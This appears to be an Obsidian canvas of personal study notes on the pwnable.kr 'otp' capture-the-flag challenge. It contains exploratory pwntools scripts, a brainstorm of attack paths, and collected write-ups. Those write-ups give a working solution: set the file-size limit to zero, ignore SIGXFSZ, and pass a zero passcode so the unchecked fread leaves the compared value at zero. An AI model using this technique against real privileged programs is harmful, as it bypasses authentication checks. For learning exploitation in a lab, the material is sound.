{
	"nodes":[
		{"id":"d9392a4ff86ea1b9","type":"text","text":"# hints\n*I made a skeleton interface for one time password authentication system.\nI guess there are no mistakes.\ncould you take a look at it?\nhint : not a race condition. do not bruteforce.*\n\nOTP stands for one time password:\n*A one-time password, also known as a one-time PIN, one-time authorization code or dynamic password, is a password that is **valid for only one login session** or transaction, on a computer system or other digital device.*\n\n```bash\n[*] '/home/otp/otp'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x400000)\n```\nNo PIE, 64 bit\n\nNo BOF...\nfile name size is 128 for some reason... is there a buffer overflow?  \nwhy does the program using `fopen` and `open`?\n[here](https://stackoverflow.com/questions/1658476/c-fopen-vs-open) it explains that `fopen` does buffering. which can be faster. ","x":-360,"y":-30,"width":740,"height":1150,"color":"2"},
		{"id":"7f23d1b4fd5796d6","type":"text","text":"# understanding the challenge\n\nargv passcode is a 8 bytes unsigned integer in hex (`base 16` ).\n\nit opens a file with random name inside `/tmp/random_name` and input inside of it 8 bytes of random values.\n\nprints OTP generated\n\nreads the passcode from the random file.  And if both the unsigned long passcode and the unsigned long long passcode are the same it cats the flag.\n","x":500,"y":261,"width":920,"height":619},
		{"id":"20bde1fea5538b18","type":"text","text":"# clearing the `otp` file\nif I could switch execution to the current python script after the file was created (after *OTP generated.*)\nI could get his name from `strace` or `autid` log.\n\nusing `strace`\n```python\nfrom pwn import *\n\nwhile True:\n    p = process('strace ./otp 0x0', shell=True)\n    p.recvuntil('/tmp/')\n    filename = p.recvuntil('\"')[:-1]\n    log.success(filename)\n\n    open('/tmp/{0}'.format(filename), 'w').close()\n    try:\n        p.recvuntil('Congratz!\\n', timeout=1)\n        p.interactive()\n        break\n    except EOFError:\n        continue\n```\nit worked but when using `strace` the privileges of the executing program damaged ...\n\n### problem\nwe don't know the file name. \n### ideas\n* I could try all files with a number in the range. using pause\n* I could read the logs\n\n```python\n   os.kill(P.pid, signal.SIGSTOP)\n   print \"doing something\"\n   os.kill(P.pid, signal.SIGCONT)\n```\n\nI did it but I could not see the created file...\n\n```python\nfrom pwn import *\nimport os\n\nwhile True:\n    p = process(['./otp', '0x0'])\n    p.recvuntil('OTP generated.\\n')\n    try:\n        os.kill(p.pid, signal.SIGSTOP)\n        log.info('bruteforcing the file name')\n        time.sleep(5)\n        os.kill(p.pid, signal.SIGCONT)    \n        break\n    except OSError:\n        p.kill()\n\nfilename = ':)'\nlog.success(filename)\n\nopen('/tmp/{0}'.format(filename), 'w').close()\np.interactive()\n```\n\nI can successfully catch the process before it closes, but for some reason I cannot see the created file... let's try to use debug...","x":525,"y":1880,"width":871,"height":2480},
		{"id":"ef8ec4f3eee454d3","type":"text","text":"# analyzing execution\n![[Pasted image 20231204094013.png]] \nweird thing is that we `mov esi, 0` and it zeros ***r***si\n","x":1720,"y":-30,"width":640,"height":538},
		{"id":"537fea1c223f8145","type":"text","text":"# abilities\n\n* I don't have failure checks for `fread` and `fwrites` and they could be checked like in the first read.\n* I could change environment variables (changing `TMPDIR` ?)\n* I could read and write to files under `/tmp` \n* I control `argv[1]` (a huge one?)`\n\n\n","x":490,"y":1180,"width":930,"height":340},
		{"id":"661a30aa60672bb5","type":"text","text":"# weird size problems\nOn UNIX systems we use LP64 (4/8/8), meaning long, long long and pointers are 8 bytes. \nso the comparison works. \n\nit's weird though that the programmer used `strtoul` in purpose. it seems like a hint... what can I do?","x":1760,"y":1180,"width":1240,"height":300},
		{"id":"f876cbc84f6b2106","type":"text","text":"# time consumption\n\n1. clearing `otp` file\n2. the code itself\n3. trying to find the right timing using brute force for catching the `otp` file","x":-1243,"y":261,"width":729,"height":380,"color":"4"},
		{"id":"a36dd91e466a94a1","type":"text","text":"## reading to passcode a corrupted file pointer","x":-2909,"y":2911,"width":589,"height":275},
		{"id":"f6602317621d4054","type":"text","text":"## controlling passcode (using the program like `loveletter`)\n","x":-3293,"y":2395,"width":769,"height":160,"color":"3"},
		{"id":"f5793276e44f7577","type":"text","text":"## `fread` / `fwrite` will stop\n* if reached an EOF\n* file size will be limited.","x":-3600,"y":3049,"width":615,"height":191,"color":"4"},
		{"id":"4056908007744e53","type":"text","text":"# Bottom-up\n\nI could bypass the check if:\n* I will control passcode.\n* I will redirect code execution to after the condition.","x":-3399,"y":2000,"width":980,"height":270},
		{"id":"ed8d6f5ff6e83263","type":"text","text":"# redirecting code execution","x":-4553,"y":2064,"width":696,"height":142},
		{"id":"84e699e2d46e87f8","type":"text","text":"## changing RA (`ebp` based)","x":-4114,"y":2403,"width":434,"height":152},
		{"id":"801d2c3320125178","type":"text","text":"## GOT overwrite","x":-4690,"y":2395,"width":485,"height":124},
		{"id":"b0c65494eda28c5d","type":"text","text":"## UAF","x":-4940,"y":2240,"width":250,"height":60},
		{"id":"b5232f710a4aceb4","type":"text","text":"## overflowing the stack\ndidn't found something interesting inside the execution of the program.","x":-2113,"y":2739,"width":593,"height":261,"color":"4"},
		{"id":"ea7fe4fb991c8654","type":"text","text":"# writing passcode to the return value of `strtoul` ","x":-4690,"y":3186,"width":742,"height":286},
		{"id":"6ca99fbc853c1d53","type":"text","text":"## changing the file's content","x":-4913,"y":2739,"width":720,"height":140},
		{"id":"80ff8ccc32fbf71c","type":"text","text":"# process mapping\n![[Pasted image 20231211094806.png]]\nthe `vdso` and `vsyscall` used to call `syscalls` with user mode privileges inside the program.\n`vdso` virtual dynamic shared objects (`syscalls` for `glibc`)\n`vsyscall` virtual `syscall` (for the program)\n[ref](https://stackoverflow.com/questions/19938324/what-are-vdso-and-vsyscall)\n","x":-1816,"y":3472,"width":1260,"height":716},
		{"id":"9385050ba59cc667","type":"text","text":"### file size limit\nif we set the limit with `ulimit -f 0`  and block the XFSZ signal. ","x":-3948,"y":3640,"width":506,"height":203,"color":"4"},
		{"id":"f1d9c20572ea4877","type":"text","text":"### blocking the signal\n\n```python\nimport subprocess\nimport signal\n\n# ulimit -f 0\n\ndef preexec_function():\n    # Ignore the SIGINT signal by setting the handler to the standard\n    # signal handler SIG_IGN.\n    signal.signal(signal.SIGINT, signal.SIG_IGN)\n\np = subprocess.Popen(\n    [\"./otp\", \"0x0\"],\n    preexec_fn = preexec_function\n)\n```\n\nchanging the handler function","x":-3951,"y":4060,"width":1351,"height":820,"color":"4"},
		{"id":"e826fb138cbb81b8","type":"text","text":"### try to cause an EOF\nI tried to insert 0x04 on my local machine and it didn't crashed\nI can try to run this code remotely...","x":-3238,"y":3372,"width":658,"height":268},
		{"id":"52e5bb1b69e35b6c","type":"text","text":"# Writeups\n\n### IdanMamen\n```bash\nulimit -f 0 && trap '' XFSZ\n./otp 0\n```\n\n### IdanRosen\n\nthe vulnerability is that code doesn't check the return value of `fread()`, `fwrite()`, and `fclose()`.\n\nwe can crash those functions by limiting the maximum file size that the process can open to 0. fopen() still works, it creates a new empty file. the function fwrite() write nothing and returns error value. the function fclose() tries to flush what fwrite() added to the buffer but it fails too. fread() reads 0 bytes. at the end, the value of passcode always stays 0 as no writing and no reading happened.\n\nbut another problem that occurs is that there is a signal SIGXFSZ that crashes the program when fclose() tries to ultimately flush the FILE buffer from fwrite(). this is not a problem we can just specify a custom handler of our own that doesn't terminate the program, or we can specify to ignore that signal.\n```c\n#include <unistd.h>\n#include <signal.h>\n\nint main() {\n\tsignal(SIGXFSZ, SIG_IGN); // ignore the signal. if we instead specify a custom handler it may not work because of execve(). (see the man page).\n\n\tchar* path = \"/home/otp/otp\";\n\tchar *args[] = {path, \"0\", NULL}; // second arg is 0, that will be compared to passcode\n\tchar *env[] = {NULL};\n\n\texecve(path, args, env); // execute the process\n}\n\n\nin shell:\n\n(ulimit -f 0; ./solve)\n```\n","x":-1120,"y":1330,"width":1200,"height":1882},
		{"id":"5ff16baea6dce1a4","type":"text","text":"# learning\n## The right thinking flow\n* why the program used `strtoul` ?\n* when comparing different parts of the code we can see that when reading from /dev/urandom we check for failure and when reading from the OTP file we don't... this is a vulnerability! \n* crashing `fread` `fwrite` worked with `ulimit -f 0` but the program stops executing. To solve this problem I can try block / trap the signal, or continue executing like in gdb.\n* You can change the signal handler to IGN_SIGN which ignores the signal.\n\n### Things to preserve \n* using gdb\n* reading the techniques before starting to work\n* all directions are valid.\n### Things to improve\n* my detection of a vulnerability \n* only continue if I find the vulnerability. Then I can define my ability (`ulimit -f 0` & blocking the signal)\n\n## Time consumed \ntrying to test directions that known to not be the direction.\nwriting all possible attacks even though I didn't had the vulnerability.","x":-2360,"y":700,"width":800,"height":1160}
	],
	"edges":[
		{"id":"d3fed66caa1c51b7","fromNode":"7f23d1b4fd5796d6","fromSide":"bottom","toNode":"537fea1c223f8145","toSide":"top"},
		{"id":"96c8ba3e06746311","fromNode":"537fea1c223f8145","fromSide":"bottom","toNode":"20bde1fea5538b18","toSide":"top"},
		{"id":"31cf47edd04fb4c1","fromNode":"7f23d1b4fd5796d6","fromSide":"right","toNode":"ef8ec4f3eee454d3","toSide":"left"},
		{"id":"96a6a02794c4b1a2","fromNode":"7f23d1b4fd5796d6","fromSide":"bottom","toNode":"661a30aa60672bb5","toSide":"top"},
		{"id":"a25b528ac5a43e36","fromNode":"4056908007744e53","fromSide":"bottom","toNode":"f6602317621d4054","toSide":"top"},
		{"id":"35e84fb05372fb2b","fromNode":"f6602317621d4054","fromSide":"bottom","toNode":"f5793276e44f7577","toSide":"top"},
		{"id":"ea3276a2bb3423f0","fromNode":"f6602317621d4054","fromSide":"bottom","toNode":"a36dd91e466a94a1","toSide":"top"},
		{"id":"27eeaf278b58e499","fromNode":"f6602317621d4054","fromSide":"left","toNode":"6ca99fbc853c1d53","toSide":"right"},
		{"id":"b1e102e825d47ac7","fromNode":"4056908007744e53","fromSide":"left","toNode":"ed8d6f5ff6e83263","toSide":"right"},
		{"id":"c53cc1e5a863a7e9","fromNode":"ed8d6f5ff6e83263","fromSide":"bottom","toNode":"84e699e2d46e87f8","toSide":"top"},
		{"id":"869fc2bc17e01117","fromNode":"ed8d6f5ff6e83263","fromSide":"bottom","toNode":"801d2c3320125178","toSide":"top"},
		{"id":"c8f241d5bbc44ef0","fromNode":"ed8d6f5ff6e83263","fromSide":"left","toNode":"b0c65494eda28c5d","toSide":"right"},
		{"id":"c793d9775070676d","fromNode":"f6602317621d4054","fromSide":"bottom","toNode":"b5232f710a4aceb4","toSide":"top"},
		{"id":"69c710992fc9600f","fromNode":"f6602317621d4054","fromSide":"bottom","toNode":"ea7fe4fb991c8654","toSide":"top"},
		{"id":"64611a96d810e7cc","fromNode":"f5793276e44f7577","fromSide":"bottom","toNode":"e826fb138cbb81b8","toSide":"top"},
		{"id":"7cd48edad7172e76","fromNode":"f5793276e44f7577","fromSide":"bottom","toNode":"9385050ba59cc667","toSide":"top"},
		{"id":"64dea1ce2a9cf136","fromNode":"9385050ba59cc667","fromSide":"bottom","toNode":"f1d9c20572ea4877","toSide":"top"}
	]
}